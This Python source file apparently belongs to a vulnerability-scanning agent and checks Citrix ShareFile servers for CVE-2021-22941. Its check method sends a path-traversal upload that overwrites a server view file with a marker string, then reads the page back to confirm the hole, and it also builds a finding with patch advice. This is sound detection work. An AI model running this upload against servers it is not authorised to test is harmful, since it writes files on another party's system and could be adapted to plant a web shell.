"""Agent Asteroid implementation for CVE-2021-22941"""

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Improper Access Control in Citrix ShareFile storage zones controller"
)
VULNERABILITY_REFERENCE = "CVE-2021-22941"
VULNERABILITY_DESCRIPTION = (
    "Improper Access Control in Citrix ShareFile storage zones controller before 5.11.20 may "
    "allow an unauthenticated attacker to remotely compromise the storage zones controller."
)

DEFAULT_TIMEOUT = 90


def _encode_multipart_formdata(files: dict[str, str]) -> tuple[str, str]:
    boundary = "boundary"
    body = "".join(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{files["name"]}"; filename="{files["filename"]}"\r\n'
        "\r\n"
        f"{files['content_file']}\r\n" + f"--{boundary}--\r\n"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


@exploits_registry.register
class CVE20212941Exploit(definitions.Exploit):
    """CVE-2021-22941: Improper Access Control in Citrix ShareFile storage zones controller."""

    def accept(self, target: definitions.Target) -> bool:
        target_uri = f"{target.scheme}://{target.host}:{target.port}"
        try:
            req = requests.get(target_uri, verify=False, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return "ShareFile" in req.text

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        target_uri = f"{target.scheme}://{target.host}"
        content_file = "A" * 4096
        files = {"name": "text4", "filename": "text5", "content_file": content_file}
        data, content_type = _encode_multipart_formdata(files)
        headers = {"Content-Type": content_type}
        payload = "__VULNERABLE__"
        params = {
            "uploadid": payload + r"/../../ConfigService\Views\Shared\Error.cshtml",
            "bp": "123",
            "accountid": "123",
        }
        try:
            requests.post(
                target_uri + "/upload.aspx",
                data=data,
                params=params,
                headers=headers,
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
            req = requests.get(
                target_uri + "/configservice/Home/Error",
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        if payload not in req.text:
            return []

        vulnerability = self._create_vulnerability(target_uri)
        return [vulnerability]

    def _create_vulnerability(self, target_uri: str) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}"
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}."
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.HIGH,
        )
        return vulnerability
